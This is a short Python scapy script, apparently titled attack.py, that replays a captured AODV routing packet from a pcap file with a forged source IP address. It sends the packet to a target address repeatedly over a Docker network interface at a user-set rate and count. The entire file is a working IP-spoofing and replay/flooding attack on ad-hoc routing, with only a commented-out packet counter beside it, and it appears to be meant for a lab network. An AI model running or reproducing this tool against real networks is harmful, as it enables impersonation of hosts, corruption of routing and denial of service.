import sys
from scapy.all import *

packets  = rdpcap('aodv_packet.pcap')
counter=0

"""
for p in packets:
	if p.haslayer(UDP):
		if(p.getlayer(UDP).sport == 654):
#			p.display()
			counter+=1
print(f"[+] processed {counter} aodv packets")
# send one packet at interface in Layer2
"""

if len(sys.argv) != 6:
	print(f"[!] attack.py <victim_IP> <dst_ip> <interval> <count> <docker_iface>")
	exit()

victim=sys.argv[1]
dst_ip=sys.argv[2]
interval=sys.argv[3]
count=sys.argv[4]

p = packets[0]
udp_layer = p.getlayer(UDP)
n_p = IP(src=victim, dst=dst_ip) / udp_layer

print(n_p.summary())
send(n_p, iface=sys.argv[5], count=int(count), inter=float(interval), verbose=3)

